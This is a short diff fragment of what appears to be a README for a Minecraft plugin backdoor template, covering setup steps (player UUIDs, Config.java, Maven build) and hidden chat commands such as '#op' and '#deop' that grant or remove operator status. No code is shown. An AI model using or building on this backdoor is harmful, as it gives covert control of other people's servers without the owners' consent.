@@ -6,7 +6,7 @@ There are probably much better backdoor templates out there, but here we are.
 You can find minecraft UUID's at: [NameMC](www.namemc.com)
 * Change other Config.java settings as desired.
 * Build using Maven.
-### Default commands
+### Default commands:
 () = required [] = optional
 * #op [player] - Set player to operator (sets self if no player specified)
 * #deop [player] - Removes player from operator (Removes self if no player specified)
